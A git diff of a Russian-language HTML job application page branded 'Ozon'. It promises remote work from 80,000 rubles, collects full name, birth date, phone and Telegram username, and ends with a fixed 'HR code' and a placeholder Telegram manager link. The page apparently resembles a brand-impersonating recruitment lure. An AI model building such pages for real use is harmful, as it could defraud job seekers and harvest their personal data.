@@ -1,52 +1,85 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ozon HR</title>
-
-  <link rel="stylesheet" href="/static/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ozon Анкета</title>
+    <link rel="stylesheet" href="/static/style.css">
 </head>
 <body>
 
 <div class="container">
 
-  <div class="card">
+    <div class="card" id="formCard">
 
-    <div class="logo">Ozon Marketplace</div>
+        <div class="logo">Ozon 😍</div>
 
-    <h1>Анкета менеджера маркетплейсов</h1>
+        <h1>Анкета менеджера<br>маркетплейсов</h1>
 
-    <div class="benefits">
-      <div>💰 Доход от 80.000 ₽</div>
-      <div>🏠 Работа удаленно</div>
-      <div>📚 Обучение с нуля</div>
-      <div>📈 Карьерный рост</div>
+        <div class="benefits">
+            💰 Доход от 80.000 ₽,
+            🏠 Работа удаленно,
+            📚 Обучение с нуля,
+            📈 Карьерный рост
+        </div>
+
+        <form id="applicationForm">
+
+            <input type="text" name="fio" placeholder="👤 ФИО полностью" required>
+
+            <input type="date" name="birth" required>
+
+            <input type="tel" name="phone" placeholder="📱 Телефон" required>
+
+            <input type="text" name="telegram" placeholder="✈ Telegram (username)" required>
+
+            <div class="label">💼 Есть ли у вас опыт?</div>
+
+            <select name="experience">
+                <option>Нет опыта</option>
+                <option>Есть опыт</option>
+            </select>
+
+            <div class="label">⏰ Сколько времени готовы уделять работе?</div>
+
+            <select name="time">
+                <option>2-4 часа</option>
+                <option>4-6 часов</option>
+                <option selected>6-8 часов</option>
+                <option>8+ часов</option>
+            </select>
+
+            <button type="submit">🚀 Отправить заявку</button>
+
+        </form>
+
     </div>
 
-    <input id="name" placeholder="Ваше имя">
-    <input id="age" placeholder="Возраст">
-    <input id="phone" placeholder="Телефон">
-    <input id="telegram" placeholder="Telegram">
+</div>
 
-    <select id="experience">
-      <option>Есть опыт</option>
-      <option>Нет опыта</option>
-    </select>
+<div class="success-screen" id="successScreen">
 
-    <select id="hours">
-      <option>2-4 часа</option>
-      <option>4-6 часов</option>
-      <option>6-8 часов</option>
-    </select>
+    <div class="success-box">
 
-    <button onclick="sendForm()">
-      Оставить заявку
-    </button>
+        <div class="success-icon">✅</div>
 
-    <div id="success"></div>
+        <h2>🎉 Заявка отправлена!</h2>
 
-  </div>
+        <p>Спасибо! Мы получили вашу заявку.</p>
+
+        <div class="track-title">Ваш HR-код:</div>
+
+        <div class="track-code" id="trackCode">6019</div>
+
+        <div class="manager-text">
+            Наш менеджер свяжется с вами в Telegram в ближайшее время
+        </div>
+
+        <a href="https://t.me/YOUR_MANAGER_USERNAME" class="manager-btn">
+            💬 Написать менеджеру
+        </a>
+
+    </div>
 
 </div>
 
